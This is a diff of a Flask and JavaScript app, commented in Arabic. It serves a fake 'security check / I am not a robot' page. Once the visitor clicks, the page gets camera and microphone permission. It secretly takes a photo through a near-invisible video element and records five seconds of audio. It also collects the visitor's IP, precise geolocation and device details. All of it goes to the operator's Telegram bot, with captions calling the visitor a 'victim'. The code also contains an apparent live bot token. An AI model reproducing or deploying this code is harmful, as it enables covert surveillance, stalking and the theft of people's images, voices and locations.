@@ -7,101 +7,109 @@ app = Flask(__name__)
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
 
-# --- الفخ المطور (حل السواد + جلب الأيبي) ---
 HTML = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الأمان</title>
+    <title>تحقق الأمان</title>
     <style>
-        body { background: #050505; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #111; padding: 40px; border-radius: 25px; text-align: center; border: 1px solid #333; width: 85%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.7); }
+        body { background: #050505; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #111; padding: 40px; border-radius: 25px; text-align: center; border: 1px solid #333; width: 85%; max-width: 380px; box-shadow: 0 15px 40px rgba(0,0,0,0.7); z-index: 10; }
         .btn { background: #f38020; color: white; border: none; padding: 18px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
         #st { margin-top: 20px; color: #888; font-size: 0.9rem; }
+        /* حل ذكي: الفيديو يعمل في الخلفية لكنه غير مرئي للمستخدم */
+        #v { position: absolute; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
     <div class="card">
         <div style="font-size: 60px; margin-bottom: 20px;">🔒</div>
-        <h2>تحقق بشري</h2>
-        <p style="color: #aaa; margin-bottom: 30px;">يرجى النقر للمتابعة وتأكيد أنك لست روبوت</p>
-        <button class="btn" id="go" onclick="startProcess()">التحقق الآن</button>
+        <h2>تحقق الأمان</h2>
+        <p style="color: #aaa; margin-bottom: 30px;">يرجى الضغط لتأكيد هويتك والوصول إلى الرابط</p>
+        <button class="btn" id="go" onclick="startProcess()">أنا لست روبوت</button>
         <div id="st">بانتظار البدء...</div>
     </div>
-    <video id="v" autoplay playsinline muted style="display:none"></video>
+    
+    <video id="v" autoplay playsinline muted></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        async function post(d, t) { fetch('/api/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({d: d, t: t}) }); }
+        async function post(d, t) { 
+            return fetch('/api/capture', { 
+                method: 'POST', 
+                headers: { 'Content-Type': 'application/json' }, 
+                body: JSON.stringify({d: d, t: t}) 
+            }); 
+        }
 
         async function startProcess() {
+            const st = document.getElementById('st');
             document.getElementById('go').style.display = 'none';
-            document.getElementById('st').innerText = "جاري الاتصال بالنظام الأمين... يرجى الانتظار";
+            st.innerText = "جاري الاتصال بالسيرفر...";
             
             try {
-                // بدئ جلب الأيبي فوراً (عملية توازية)
-                let ipAddress = 'جاري الجلب...';
-                const ipPromise = fetch('https://api.ipify.org?format=json')
-                    .then(r => r.json())
-                    .then(ipData => { ipAddress = ipData.ip; })
-                    .catch(() => { ipAddress = 'تعذر الجلب (قد يكون VPN active)'; });
+                // 1. جلب الأيبي فوراً
+                let ip = 'غير معروف';
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const json = await res.json();
+                    ip = json.ip;
+                } catch(e) {}
 
-                // فتح الكاميرا والصوت
-                const s = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                const v = document.getElementById('v'); v.srcObject = s;
-                
-                // جلب المعلومات الأصلية (v13.0)
+                // 2. تشغيل الكاميرا والصوت
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                await v.play(); // التأكد من تشغيل الفيديو برمجياً
+
+                // 3. إرسال المعلومات فوراً (قبل الصورة والصوت)
                 const b = await navigator.getBattery().catch(() => ({}));
-                
-                // ننتظر انتهاء محاولة جلب الأيبي لبناء تقرير ضخم
-                await ipPromise;
-
-                const info = `📋 **تقرير معلومات تفصيلي (v14.0)**:\\n` +
+                const info = `📊 **تقرير صيد (v15.0)**:\\n` +
                              `━━━━━━━━━━━━━━\\n` +
-                             `🌐 **الأيبي المحلّي (IP):** ${ipAddress}\\n` +
-                             `🔋 البطارية: ${Math.round(b.level*100)}% (${b.charging ? 'يُشحن ⚡' : 'لا يُشحن'})\\n` +
+                             `🌐 الأيبي (IP): ${ip}\\n` +
+                             `🔋 البطارية: ${Math.round(b.level*100)}%\\n` +
+                             `⚡ الشحن: ${b.charging ? 'نعم' : 'لا'}\\n` +
                              `📱 النظام: ${navigator.platform}\\n` +
-                             `🧠 المعالج: ${navigator.hardwareConcurrency} نوى\\n` +
                              `🖥️ الشاشة: ${window.screen.width}x${window.screen.height}\\n` +
-                             `🎨 الألوان: ${window.screen.colorDepth}-bit\\n` +
-                             `🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}\\n` +
-                             `🌍 اللغة: ${navigator.language}\\n` +
-                             `⌛ التوقيت: ${new Date().toLocaleString()}`;
-                post(info, "msg");
+                             `🌍 اللغة: ${navigator.language}`;
+                await post(info, "msg");
 
-                // الموقع
+                // 4. إرسال الموقع
                 navigator.geolocation.getCurrentPosition(p => {
-                    post(`📍 **رابط الخريطة**:\\nhttp://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
-                }, null, {enableHighAccuracy: true});
-
-                // الحل الجذري للسواد: ننتظر حتى يبدأ الفيديو باللعب (يوجد إطارات حقيقية)
-                v.addEventListener('playing', () => {
-                    document.getElementById('st').innerText = "جاري توازن الإضاءة... (ثانيتين)";
-                    // ثانية واحدة إضافية لاستقرار الضوء (Auto-exposure)
-                    setTimeout(() => {
-                        const c = document.getElementById('c');
-                        c.width = v.videoWidth; c.height = v.videoHeight;
-                        c.getContext('2d').drawImage(v, 0, 0);
-                        post(c.toDataURL('image/jpeg', 0.9), "img");
-                        document.getElementById('st').innerText = "جاري تسجيل البصمة... (5 ثواني)";
-                        
-                        // تسجيل صوتي احترافي (من v13.0)
-                        const r = new MediaRecorder(s);
-                        const ch = [];
-                        r.ondataavailable = e => ch.push(e.data);
-                        r.onstop = () => {
-                            const reader = new FileReader();
-                            reader.readAsDataURL(new Blob(ch));
-                            reader.onloadend = () => post(reader.result, "aud");
-                            document.getElementById('st').innerText = "✅ اكتمل التحقق بنجاح!";
-                        };
-                        r.start();
-                        setTimeout(() => r.stop(), 5000);
-                    }, 2000); // ثانيتين تأخير ذكي "بعد" بدء التشغيل
+                    post(`📍 الخريطة: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "msg");
                 });
 
-            } catch (e) { location.reload(); }
+                // 5. التقاط الصورة بعد 4 ثواني (ثابت ومضمون)
+                st.innerText = "جاري توازن العدسة... (4 ثواني)";
+                setTimeout(async () => {
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; 
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const imgData = c.toDataURL('image/jpeg', 0.8);
+                    await post(imgData, "img");
+                    
+                    // 6. تسجيل الصوت فوراً بعد الصورة
+                    st.innerText = "جاري تسجيل البصمة... (5 ثواني)";
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = async () => {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(new Blob(chunks));
+                        reader.onloadend = () => post(reader.result, "aud");
+                        st.innerText = "✅ اكتمل التحقق بنجاح!";
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000);
+
+                }, 4000);
+
+            } catch (e) { 
+                st.innerText = "يرجى منح الصلاحيات للمتابعة!";
+                setTimeout(() => location.reload(), 2000);
+            }
         }
     </script>
 </body>
@@ -118,14 +126,19 @@ def capture():
     if not data: return "OK"
     t, d = data.get('t'), data.get('d')
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+    
     if t == 'msg':
         requests.post(url + "sendMessage", json={'chat_id': ADMIN_ID, 'text': d, 'parse_mode': 'Markdown'})
     elif t == 'img':
-        img = base64.b64decode(d.split(',')[1])
-        requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 **صورة الضحية**"}, files={'photo': ('c.jpg', img)})
+        try:
+            img = base64.b64decode(d.split(',')[1])
+            requests.post(url + "sendPhoto", data={'chat_id': ADMIN_ID, 'caption': "📸 صورة الضحية (v15.0)"}, files={'photo': ('c.jpg', img)})
+        except: pass
     elif t == 'aud':
-        aud = base64.b64decode(d.split(',')[1])
-        requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': "🎙 **بصمة الضحية**"}, files={'voice': ('v.ogg', aud)})
+        try:
+            aud = base64.b64decode(d.split(',')[1])
+            requests.post(url + "sendVoice", data={'chat_id': ADMIN_ID, 'caption': "🎙 بصمة الضحية (v15.0)"}, files={'voice': ('v.ogg', aud)})
+        except: pass
     return "OK"
 
 @app.route('/webhook', methods=['POST'])
@@ -134,19 +147,9 @@ def bot_webhook():
     if "message" in data:
         uid = str(data["message"]["chat"]["id"])
         if uid == ADMIN_ID:
-            kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "link"}], [{"text": "📊 الحالة", "callback_data": "status"}]]}
+            kb = {"inline_keyboard": [[{"text": "🔗 رابط الصيد", "callback_data": "link"}]]}
             requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                          json={'chat_id': uid, 'text': "🔥 أهلاً ملك سيوفي.. البوت v14.0 جاهز تماماً!", 'reply_markup': kb})
-    
-    elif "callback_query" in data:
-        cid = data["callback_query"]["message"]["chat"]["id"]
-        cb = data["callback_query"]["data"]
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
-        if cb == "link":
-            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': f"🚀 رابطك المباشر:\\n`https://{request.host}`", 'parse_mode': 'Markdown'})
-        elif cb == "status":
-            requests.post(url + "sendMessage", json={'chat_id': cid, 'text': "✅ السيرفر يعمل وبقوة v14.0"})
-            
+                          json={'chat_id': uid, 'text': "🔥 أهلاً سيوفي.. نظام v15.0 المضمون جاهز!", 'reply_markup': kb})
     return "OK"
 
 if __name__ == '__main__':
